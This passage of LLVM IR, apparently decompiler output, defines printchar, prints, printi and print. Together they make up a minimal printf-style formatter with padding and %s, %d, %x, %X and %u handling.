  uselistorder i32 %storemerge1, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8450, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 5, 3, 7, 6, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder label %dec_label_pc_8520, { 1, 0 }
  uselistorder label %dec_label_pc_8520.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_84b0, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_8568 = ptrtoint i32* %stack_var_-24 to i32
  %v0_856c = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8578 = icmp eq i32 %v0_856c, 0
  br i1 %v2_8578, label %dec_label_pc_85ac, label %dec_label_pc_8580

dec_label_pc_8580:                                ; preds = %entry
  %v1_8584 = inttoptr i32 %v0_856c to i32*
  %v2_8584 = load i32, i32* %v1_8584, align 4
  %v1_8590 = trunc i32 %arg2 to i8
  %v3_8590 = inttoptr i32 %v2_8584 to i8*
  store i8 %v1_8590, i8* %v3_8590, align 1
  %v2_8598 = load i32, i32* %v1_8584, align 4
  %v1_859c = add i32 %v2_8598, 1
  store i32 %v1_859c, i32* %v1_8584, align 4
  %v1_85c8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_85c0

dec_label_pc_85ac:                                ; preds = %entry
  store i32 %v2_8568, i32* @r3, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v2_85bc = trunc i32 %v2_8568 to i16
  %v3_85bc = call i32 @__GI___libc_write(i32 1, i16 %v2_85bc)
  store i32 %v3_85bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_85c0

dec_label_pc_85c0:                                ; preds = %dec_label_pc_8580, %dec_label_pc_85ac
  %v1_85c8 = phi i32 [ %v1_85c8.pre, %dec_label_pc_8580 ], [ %v3_85bc, %dec_label_pc_85ac ]
  ret i32 %v1_85c8

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_85c0, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %v3_85d0 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp43 = icmp slt i32 %arg3, 1
  br i1 %tmp43, label %dec_label_pc_8688, label %dec_label_pc_8608

dec_label_pc_8608:                                ; preds = %entry
  %v2_863820 = load i8, i8* %arg2, align 1
  %v2_863c22 = icmp eq i8 %v2_863820, 0
  br i1 %v2_863c22, label %dec_label_pc_8644, label %dec_label_pc_861c

dec_label_pc_861c:                                ; preds = %dec_label_pc_8608, %dec_label_pc_861c
  %v4_863424 = phi i32 [ %v1_862c, %dec_label_pc_861c ], [ %tmp, %dec_label_pc_8608 ]
  %stack_var_-40.023 = phi i32 [ %v1_8620, %dec_label_pc_861c ], [ 0, %dec_label_pc_8608 ]
  %v1_8620 = add i32 %stack_var_-40.023, 1
  %v1_862c = add i32 %v4_863424, 1
  %v5_8630 = inttoptr i32 %v1_862c to i8*
  %v2_8638 = load i8, i8* %v5_8630, align 1
  %v2_863c = icmp eq i8 %v2_8638, 0
  br i1 %v2_863c, label %dec_label_pc_8644, label %dec_label_pc_861c

dec_label_pc_8644:                                ; preds = %dec_label_pc_861c, %dec_label_pc_8608
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_8608 ], [ %v1_8620, %dec_label_pc_861c ]
  %v5_8650 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_8650, label %dec_label_pc_8660, label %dec_label_pc_8670

dec_label_pc_8660:                                ; preds = %dec_label_pc_8644
  %v2_8668 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8670

dec_label_pc_8670:                                ; preds = %dec_label_pc_8644, %dec_label_pc_8660
  %storemerge4 = phi i32 [ %v2_8668, %dec_label_pc_8660 ], [ 0, %dec_label_pc_8644 ]
  %v1_8674 = and i32 %arg4, 2
  %v2_8678 = icmp eq i32 %v1_8674, 0
  br i1 %v2_8678, label %dec_label_pc_8688, label %dec_label_pc_8680

dec_label_pc_8680:                                ; preds = %dec_label_pc_8670
  br label %dec_label_pc_8688

dec_label_pc_8688:                                ; preds = %dec_label_pc_8670, %entry, %dec_label_pc_8680
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge4, %dec_label_pc_8670 ], [ %storemerge4, %dec_label_pc_8680 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8670 ], [ 48, %dec_label_pc_8680 ]
  %v1_868c = urem i32 %arg4, 2
  %v2_8690 = icmp eq i32 %v1_868c, 0
  br i1 %v2_8690, label %dec_label_pc_86c0.preheader, label %dec_label_pc_86fc.preheader

dec_label_pc_86c0.preheader:                      ; preds = %dec_label_pc_8688
  %v5_86c817 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_86c817, label %dec_label_pc_869c.lr.ph, label %dec_label_pc_86fc.preheader

dec_label_pc_869c.lr.ph:                          ; preds = %dec_label_pc_86c0.preheader
  %v2_86a4 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_869c

dec_label_pc_869c:                                ; preds = %dec_label_pc_869c.lr.ph, %dec_label_pc_869c
  %stack_var_-28.118 = phi i32 [ %stack_var_-28.0, %dec_label_pc_869c.lr.ph ], [ %v1_86b8, %dec_label_pc_869c ]
  %v3_86a4 = call i32 @printchar(i32* %v2_86a4, i32 %stack_var_-44.0)
  %v3_86a8 = load i32, i32* %stack_var_-48, align 4
  %v1_86ac = add i32 %v3_86a8, 1
  store i32 %v1_86ac, i32* %stack_var_-48, align 4
  %v1_86b8 = add nsw i32 %stack_var_-28.118, -1
  %v5_86c8 = icmp sgt i32 %stack_var_-28.118, 1
  br i1 %v5_86c8, label %dec_label_pc_869c, label %dec_label_pc_86fc.preheader

dec_label_pc_86fc.preheader:                      ; preds = %dec_label_pc_869c, %dec_label_pc_86c0.preheader, %dec_label_pc_8688
  %v3_874028 = phi i32 [ 0, %dec_label_pc_8688 ], [ 0, %dec_label_pc_86c0.preheader ], [ %v1_86ac, %dec_label_pc_869c ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8688 ], [ %stack_var_-28.0, %dec_label_pc_86c0.preheader ], [ 0, %dec_label_pc_869c ]
  %v2_870010 = load i8, i8* %arg2, align 1
  %v2_870412 = icmp eq i8 %v2_870010, 0
  br i1 %v2_870412, label %dec_label_pc_8734.preheader, label %dec_label_pc_86d0.lr.ph

dec_label_pc_86d0.lr.ph:                          ; preds = %dec_label_pc_86fc.preheader
  %v2_86e0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86d0

dec_label_pc_86d0:                                ; preds = %dec_label_pc_86d0.lr.ph, %dec_label_pc_86d0
  %v4_86fc14 = phi i32 [ %tmp, %dec_label_pc_86d0.lr.ph ], [ %v1_86f4, %dec_label_pc_86d0 ]
  %stack_var_-24.013 = phi i8* [ %arg2, %dec_label_pc_86d0.lr.ph ], [ %v5_86f8, %dec_label_pc_86d0 ]
  %v2_86d4 = load i8, i8* %stack_var_-24.013, align 1
  %v3_86d4 = zext i8 %v2_86d4 to i32
  %v3_86e0 = call i32 @printchar(i32* %v2_86e0, i32 %v3_86d4)
  %v3_86e4 = load i32, i32* %stack_var_-48, align 4
  %v1_86e8 = add i32 %v3_86e4, 1
  store i32 %v1_86e8, i32* %stack_var_-48, align 4
  %v1_86f4 = add i32 %v4_86fc14, 1
  %v5_86f8 = inttoptr i32 %v1_86f4 to i8*
  %v2_8700 = load i8, i8* %v5_86f8, align 1
  %v2_8704 = icmp eq i8 %v2_8700, 0
  br i1 %v2_8704, label %dec_label_pc_8734.preheader, label %dec_label_pc_86d0

dec_label_pc_8734.preheader:                      ; preds = %dec_label_pc_86d0, %dec_label_pc_86fc.preheader
  %v3_874027 = phi i32 [ %v3_874028, %dec_label_pc_86fc.preheader ], [ %v1_86e8, %dec_label_pc_86d0 ]
  %v5_873c7 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_873c7, label %dec_label_pc_8710.lr.ph, label %dec_label_pc_8740

dec_label_pc_8710.lr.ph:                          ; preds = %dec_label_pc_8734.preheader
  %v2_8718 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8710

dec_label_pc_8710:                                ; preds = %dec_label_pc_8710.lr.ph, %dec_label_pc_8710
  %stack_var_-28.38 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_8710.lr.ph ], [ %v1_872c, %dec_label_pc_8710 ]
  %v3_8718 = call i32 @printchar(i32* %v2_8718, i32 %stack_var_-44.0)
  %v3_871c = load i32, i32* %stack_var_-48, align 4
  %v1_8720 = add i32 %v3_871c, 1
  store i32 %v1_8720, i32* %stack_var_-48, align 4
  %v1_872c = add nsw i32 %stack_var_-28.38, -1
  %v5_873c = icmp sgt i32 %stack_var_-28.38, 1
  br i1 %v5_873c, label %dec_label_pc_8710, label %dec_label_pc_8740

dec_label_pc_8740:                                ; preds = %dec_label_pc_8710, %dec_label_pc_8734.preheader
  %v3_8740 = phi i32 [ %v3_874027, %dec_label_pc_8734.preheader ], [ %v1_8720, %dec_label_pc_8710 ]
  store i32 %v3_85d0, i32* @fp, align 4
  ret i32 %v3_8740

; uselistorder directives
  uselistorder i32 %v1_86f4, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_862c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8710, { 1, 0 }
  uselistorder label %dec_label_pc_86d0, { 1, 0 }
  uselistorder label %dec_label_pc_869c, { 1, 0 }
  uselistorder label %dec_label_pc_8688, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8670, { 1, 0 }
  uselistorder label %dec_label_pc_861c, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_8758 = load i32, i32* @fp, align 4
  store i32 34656, i32* %stack_var_-4, align 4
  %v2_875c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_875c, i32* @fp, align 4
  %v1_8790 = icmp slt i32 %arg2, 0
  %v2_8790 = icmp eq i32 %arg2, 0
  br i1 %v2_8790, label %dec_label_pc_8798, label %dec_label_pc_87cc

dec_label_pc_8798:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_87bc = bitcast i32* %stack_var_-28 to i8*
  %v6_87bc = call i32 @prints(i32 %arg1, i8* %v5_87bc, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_892c

dec_label_pc_87cc:                                ; preds = %entry
  %v2_87d0 = icmp eq i32 %arg4, 0
  br i1 %v2_87d0, label %dec_label_pc_8804, label %dec_label_pc_87d8

dec_label_pc_87d8:                                ; preds = %dec_label_pc_87cc
  %v7_87dc = icmp eq i32 %arg3, 10
  br i1 %v7_87dc, label %dec_label_pc_87e4, label %dec_label_pc_8804

dec_label_pc_87e4:                                ; preds = %dec_label_pc_87d8
  br i1 %v1_8790, label %dec_label_pc_87f0, label %dec_label_pc_8804

dec_label_pc_87f0:                                ; preds = %dec_label_pc_87e4
  %v1_87fc = sub i32 0, %arg2
  br label %dec_label_pc_8804

dec_label_pc_8804:                                ; preds = %dec_label_pc_87e4, %dec_label_pc_87d8, %dec_label_pc_87cc, %dec_label_pc_87f0
  %stack_var_-52.0 = phi i32 [ %arg2, %dec_label_pc_87cc ], [ %v1_87fc, %dec_label_pc_87f0 ], [ %arg2, %dec_label_pc_87e4 ], [ %arg2, %dec_label_pc_87d8 ]
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_87cc ], [ 1, %dec_label_pc_87f0 ], [ 0, %dec_label_pc_87e4 ], [ 0, %dec_label_pc_87d8 ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_88984 = icmp eq i32 %stack_var_-52.0, 0
  br i1 %v2_88984, label %dec_label_pc_88a0, label %dec_label_pc_8820.lr.ph

dec_label_pc_8820.lr.ph:                          ; preds = %dec_label_pc_8804
  %v1_8848 = add i32 %arg7, -58
  br label %dec_label_pc_8820

dec_label_pc_8820:                                ; preds = %dec_label_pc_8820.lr.ph, %dec_label_pc_8858
  %stack_var_-52.16 = phi i32 [ %stack_var_-52.0, %dec_label_pc_8820.lr.ph ], [ %v2_882c, %dec_label_pc_8858 ]
  %stack_var_-68.05 = phi i8* [ %tmp26, %dec_label_pc_8820.lr.ph ], [ %v5_8860, %dec_label_pc_8858 ]
  %v2_882c = udiv i32 %stack_var_-52.16, %arg3
  %v3_882c = urem i32 %stack_var_-52.16, %arg3
  %v7_8840 = icmp slt i32 %v3_882c, 10
  br i1 %v7_8840, label %dec_label_pc_8858, label %dec_label_pc_8844

dec_label_pc_8844:                                ; preds = %dec_label_pc_8820
  %v2_8850 = add i32 %v3_882c, %v1_8848
  br label %dec_label_pc_8858

dec_label_pc_8858:                                ; preds = %dec_label_pc_8820, %dec_label_pc_8844
  %stack_var_-64.0 = phi i32 [ %v3_882c, %dec_label_pc_8820 ], [ %v2_8850, %dec_label_pc_8844 ]
  %v4_8858 = ptrtoint i8* %stack_var_-68.05 to i32
  %v1_885c = add i32 %v4_8858, -1
  %v5_8860 = inttoptr i32 %v1_885c to i8*
  %fold = add i32 %stack_var_-64.0, 48
  %v1_8878 = trunc i32 %fold to i8
  store i8 %v1_8878, i8* %v5_8860, align 1
  %v2_8898 = icmp ult i32 %stack_var_-52.16, %arg3
  br i1 %v2_8898, label %dec_label_pc_88a0, label %dec_label_pc_8820

dec_label_pc_88a0:                                ; preds = %dec_label_pc_8858, %dec_label_pc_8804
  %stack_var_-68.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_8804 ], [ %v5_8860, %dec_label_pc_8858 ]
  %v2_88a4 = icmp eq i32 %stack_var_-60.0, 0
  br i1 %v2_88a4, label %dec_label_pc_8908, label %dec_label_pc_88ac

dec_label_pc_88ac:                                ; preds = %dec_label_pc_88a0
  %v3_88ac = load i32, i32* %stack_var_0, align 4
  %v2_88b0 = icmp eq i32 %v3_88ac, 0
  br i1 %v2_88b0, label %dec_label_pc_88f0, label %dec_label_pc_88b8

dec_label_pc_88b8:                                ; preds = %dec_label_pc_88ac
  %v1_88bc = and i32 %arg6, 2
  %v2_88c0 = icmp eq i32 %v1_88bc, 0
  br i1 %v2_88c0, label %dec_label_pc_88f0, label %dec_label_pc_88c8

dec_label_pc_88c8:                                ; preds = %dec_label_pc_88b8
  %v2_88d0 = inttoptr i32 %arg1 to i32*
  %v3_88d0 = call i32 @printchar(i32* %v2_88d0, i32 45)
  %v3_88e0 = load i32, i32* %stack_var_0, align 4
  %v1_88e4 = add i32 %v3_88e0, -1
  store i32 %v1_88e4, i32* %stack_var_0, align 4
  br label %dec_label_pc_8908

dec_label_pc_88f0:                                ; preds = %dec_label_pc_88b8, %dec_label_pc_88ac
  %v4_88f0 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_88f4 = add i32 %v4_88f0, -1
  %v5_88f8 = inttoptr i32 %v1_88f4 to i8*
  store i8 45, i8* %v5_88f8, align 1
  br label %dec_label_pc_8908

dec_label_pc_8908:                                ; preds = %dec_label_pc_88a0, %dec_label_pc_88c8, %dec_label_pc_88f0
  %stack_var_-68.1 = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_88a0 ], [ %v5_88f8, %dec_label_pc_88f0 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_88c8 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_88a0 ], [ 0, %dec_label_pc_88f0 ], [ 1, %dec_label_pc_88c8 ]
  %v3_8910 = load i32, i32* %stack_var_0, align 4
  %v6_8918 = call i32 @prints(i32 %arg1, i8* %stack_var_-68.1, i32 %v3_8910, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_8924 = add i32 %v6_8918, %stack_var_-56.0
  br label %dec_label_pc_892c

dec_label_pc_892c:                                ; preds = %dec_label_pc_8798, %dec_label_pc_8908
  %storemerge2 = phi i32 [ %v2_8924, %dec_label_pc_8908 ], [ %v6_87bc, %dec_label_pc_8798 ]
  store i32 %v3_8758, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-68.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8860, { 0, 2, 1 }
  uselistorder i32 %v3_882c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_892c, { 1, 0 }
  uselistorder label %dec_label_pc_8908, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8858, { 1, 0 }
  uselistorder label %dec_label_pc_8820, { 1, 0 }
  uselistorder label %dec_label_pc_8804, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8944 = load i32, i32* @fp, align 4
  store i32 35148, i32* %stack_var_-4, align 4
  %v2_8948 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8948, i32* @fp, align 4
  %stack_var_-32.428 = inttoptr i32 %arg2 to i8*
  %v2_8cf429 = load i8, i8* %stack_var_-32.428, align 1
  %v2_8cf831 = icmp eq i8 %v2_8cf429, 0
  br i1 %v2_8cf831, label %dec_label_pc_8d00, label %dec_label_pc_8968.lr.ph

dec_label_pc_8968.lr.ph:                          ; preds = %entry
  %v5_8cac = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8968

dec_label_pc_8968:                                ; preds = %dec_label_pc_8968.lr.ph, %dec_label_pc_8ce4
  %stack_var_-32.435 = phi i8* [ %stack_var_-32.428, %dec_label_pc_8968.lr.ph ], [ %stack_var_-32.4, %dec_label_pc_8ce4 ]
  %stack_var_-32.4.in34 = phi i32 [ %arg2, %dec_label_pc_8968.lr.ph ], [ %v1_8ce8, %dec_label_pc_8ce4 ]
  %stack_var_-36.133 = phi i32 [ %arg3, %dec_label_pc_8968.lr.ph ], [ %stack_var_-36.0, %dec_label_pc_8ce4 ]
  %stack_var_-44.132 = phi i32 [ 0, %dec_label_pc_8968.lr.ph ], [ %stack_var_-44.0, %dec_label_pc_8ce4 ]
  %v2_896c = load i8, i8* %stack_var_-32.435, align 1
  %v7_8970 = icmp eq i8 %v2_896c, 37
  br i1 %v7_8970, label %dec_label_pc_8978, label %dec_label_pc_8cc4

dec_label_pc_8978:                                ; preds = %dec_label_pc_8968
  %v1_897c = add i32 %stack_var_-32.4.in34, 1
  %v5_8980 = inttoptr i32 %v1_897c to i8*
  %v2_8998 = load i8, i8* %v5_8980, align 1
  %v2_899c = icmp eq i8 %v2_8998, 0
  br i1 %v2_899c, label %dec_label_pc_8d00, label %dec_label_pc_89a4

dec_label_pc_89a4:                                ; preds = %dec_label_pc_8978
  %v2_89a8 = load i8, i8* %v5_8980, align 1
  %v7_89ac = icmp eq i8 %v2_89a8, 37
  br i1 %v7_89ac, label %dec_label_pc_8cc4, label %dec_label_pc_89b4

dec_label_pc_89b4:                                ; preds = %dec_label_pc_89a4
  %v2_89b8 = load i8, i8* %v5_8980, align 1
  %v7_89bc = icmp eq i8 %v2_89b8, 45
  br i1 %v7_89bc, label %dec_label_pc_89c4, label %dec_label_pc_89f4.preheader

dec_label_pc_89c4:                                ; preds = %dec_label_pc_89b4
  %v1_89c8 = add i32 %stack_var_-32.4.in34, 2
  %v5_89cc = inttoptr i32 %v1_89c8 to i8*
  br label %dec_label_pc_89f4.preheader

dec_label_pc_89f4.preheader:                      ; preds = %dec_label_pc_89c4, %dec_label_pc_89b4
  %stack_var_-32.0.ph = phi i8* [ %v5_8980, %dec_label_pc_89b4 ], [ %v5_89cc, %dec_label_pc_89c4 ]
  %stack_var_-48.0.ph = phi i32 [ 0, %dec_label_pc_89b4 ], [ 1, %dec_label_pc_89c4 ]
  %v4_89f42 = ptrtoint i8* %stack_var_-32.0.ph to i32
  %v2_89f83 = load i8, i8* %stack_var_-32.0.ph, align 1
  %v7_89fc7 = icmp eq i8 %v2_89f83, 48
  br i1 %v7_89fc7, label %dec_label_pc_89dc, label %dec_label_pc_8a40.preheader

dec_label_pc_89dc:                                ; preds = %dec_label_pc_89f4.preheader, %dec_label_pc_89dc
  %v4_89f49 = phi i32 [ %v1_89e0, %dec_label_pc_89dc ], [ %v4_89f42, %dec_label_pc_89f4.preheader ]
  %stack_var_-48.08 = phi i32 [ %v1_89ec, %dec_label_pc_89dc ], [ %stack_var_-48.0.ph, %dec_label_pc_89f4.preheader ]
  %v1_89e0 = add i32 %v4_89f49, 1
  %v5_89e4 = inttoptr i32 %v1_89e0 to i8*
  %v1_89ec = or i32 %stack_var_-48.08, 2
  %v2_89f8 = load i8, i8* %v5_89e4, align 1
  %v7_89fc = icmp eq i8 %v2_89f8, 48
  br i1 %v7_89fc, label %dec_label_pc_89dc, label %dec_label_pc_8a40.preheader

dec_label_pc_8a40.preheader:                      ; preds = %dec_label_pc_89dc, %dec_label_pc_89f4.preheader
  %stack_var_-48.0.lcssa = phi i32 [ %stack_var_-48.0.ph, %dec_label_pc_89f4.preheader ], [ %v1_89ec, %dec_label_pc_89dc ]
  %stack_var_-32.0.lcssa = phi i8* [ %stack_var_-32.0.ph, %dec_label_pc_89f4.preheader ], [ %v5_89e4, %dec_label_pc_89dc ]
  %v4_8a4011 = ptrtoint i8* %stack_var_-32.0.lcssa to i32
  %v2_8a4412 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_8a4412, 48
  br i1 %tmp60, label %dec_label_pc_8a60, label %dec_label_pc_8a50

dec_label_pc_8a08:                                ; preds = %dec_label_pc_8a50
  %v2_8a14 = mul i32 %stack_var_-52.019, 10
  %v2_8a20 = load i8, i8* %stack_var_-32.120, align 1
  %v3_8a20 = zext i8 %v2_8a20 to i32
  %v1_8a24 = add i32 %v2_8a14, -48
  %v2_8a2c = add i32 %v1_8a24, %v3_8a20
  %v1_8a38 = add i32 %v4_8a4021, 1
  %v5_8a3c = inttoptr i32 %v1_8a38 to i8*
  %v2_8a44 = load i8, i8* %v5_8a3c, align 1
  %tmp61 = icmp ult i8 %v2_8a44, 48
  br i1 %tmp61, label %dec_label_pc_8a60, label %dec_label_pc_8a50

dec_label_pc_8a50:                                ; preds = %dec_label_pc_8a40.preheader, %dec_label_pc_8a08
  %v4_8a4021 = phi i32 [ %v1_8a38, %dec_label_pc_8a08 ], [ %v4_8a4011, %dec_label_pc_8a40.preheader ]
  %stack_var_-32.120 = phi i8* [ %v5_8a3c, %dec_label_pc_8a08 ], [ %stack_var_-32.0.lcssa, %dec_label_pc_8a40.preheader ]
  %stack_var_-52.019 = phi i32 [ %v2_8a2c, %dec_label_pc_8a08 ], [ 0, %dec_label_pc_8a40.preheader ]
  %v2_8a54 = load i8, i8* %stack_var_-32.120, align 1
  %tmp62 = icmp ult i8 %v2_8a54, 58
  br i1 %tmp62, label %dec_label_pc_8a08, label %dec_label_pc_8a60

dec_label_pc_8a60:                                ; preds = %dec_label_pc_8a08, %dec_label_pc_8a50, %dec_label_pc_8a40.preheader
  %stack_var_-52.0.lcssa = phi i32 [ 0, %dec_label_pc_8a40.preheader ], [ %v2_8a2c, %dec_label_pc_8a08 ], [ %stack_var_-52.019, %dec_label_pc_8a50 ]
  %stack_var_-32.1.lcssa = phi i8* [ %stack_var_-32.0.lcssa, %dec_label_pc_8a40.preheader ], [ %v5_8a3c, %dec_label_pc_8a08 ], [ %stack_var_-32.120, %dec_label_pc_8a50 ]
  %v2_8a64 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8a68 = icmp eq i8 %v2_8a64, 115
  br i1 %v7_8a68, label %dec_label_pc_8a70, label %dec_label_pc_8ad4

dec_label_pc_8a70:                                ; preds = %dec_label_pc_8a60
  %v1_8a74 = add i32 %stack_var_-36.133, 4
  %v1_8a80 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8a80 = load i32, i32* %v1_8a80, align 4
  %v2_8a8c = icmp eq i32 %v2_8a80, 0
  br i1 %v2_8a8c, label %dec_label_pc_8aa0, label %dec_label_pc_8a94

dec_label_pc_8a94:                                ; preds = %dec_label_pc_8a70
  %v5_8a98 = inttoptr i32 %v2_8a80 to i8*
  br label %dec_label_pc_8aa8

dec_label_pc_8aa0:                                ; preds = %dec_label_pc_8a70
  br label %dec_label_pc_8aa8

dec_label_pc_8aa8:                                ; preds = %dec_label_pc_8a94, %dec_label_pc_8aa0
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_321b0.39, i32 0, i32 0), %dec_label_pc_8aa0 ], [ %v5_8a98, %dec_label_pc_8a94 ]
  %v7_8abc = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8ac8 = add i32 %v7_8abc, %stack_var_-44.132
  br label %dec_label_pc_8ce4

dec_label_pc_8ad4:                                ; preds = %dec_label_pc_8a60
  %v2_8ad8 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8adc = icmp eq i8 %v2_8ad8, 100
  br i1 %v7_8adc, label %dec_label_pc_8ae4, label %dec_label_pc_8b38

dec_label_pc_8ae4:                                ; preds = %dec_label_pc_8ad4
  %v1_8ae8 = add i32 %stack_var_-36.133, 4
  %v1_8af4 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8af4 = load i32, i32* %v1_8af4, align 4
  %v7_8b20 = call i32 @printi(i32 %tmp, i32 %v2_8af4, i32 10, i32 1, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8b2c = add i32 %v7_8b20, %stack_var_-44.132
  br label %dec_label_pc_8ce4

dec_label_pc_8b38:                                ; preds = %dec_label_pc_8ad4
  %v2_8b3c = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8b40 = icmp eq i8 %v2_8b3c, 120
  br i1 %v7_8b40, label %dec_label_pc_8b48, label %dec_label_pc_8b9c

dec_label_pc_8b48:                                ; preds = %dec_label_pc_8b38
  %v1_8b4c = add i32 %stack_var_-36.133, 4
  %v1_8b58 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8b58 = load i32, i32* %v1_8b58, align 4
  %v7_8b84 = call i32 @printi(i32 %tmp, i32 %v2_8b58, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8b90 = add i32 %v7_8b84, %stack_var_-44.132
  br label %dec_label_pc_8ce4

dec_label_pc_8b9c:                                ; preds = %dec_label_pc_8b38
  %v2_8ba0 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8ba4 = icmp eq i8 %v2_8ba0, 88
  br i1 %v7_8ba4, label %dec_label_pc_8bac, label %dec_label_pc_8c00

dec_label_pc_8bac:                                ; preds = %dec_label_pc_8b9c
  %v1_8bb0 = add i32 %stack_var_-36.133, 4
  %v1_8bbc = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8bbc = load i32, i32* %v1_8bbc, align 4
  %v7_8be8 = call i32 @printi(i32 %tmp, i32 %v2_8bbc, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 65)
  %v2_8bf4 = add i32 %v7_8be8, %stack_var_-44.132
  br label %dec_label_pc_8ce4

dec_label_pc_8c00:                                ; preds = %dec_label_pc_8b9c
  %v2_8c04 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8c08 = icmp eq i8 %v2_8c04, 117
  br i1 %v7_8c08, label %dec_label_pc_8c10, label %dec_label_pc_8c64

dec_label_pc_8c10:                                ; preds = %dec_label_pc_8c00
  %v1_8c14 = add i32 %stack_var_-36.133, 4
  %v1_8c20 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c20 = load i32, i32* %v1_8c20, align 4
  %v7_8c4c = call i32 @printi(i32 %tmp, i32 %v2_8c20, i32 10, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8c58 = add i32 %v7_8c4c, %stack_var_-44.132
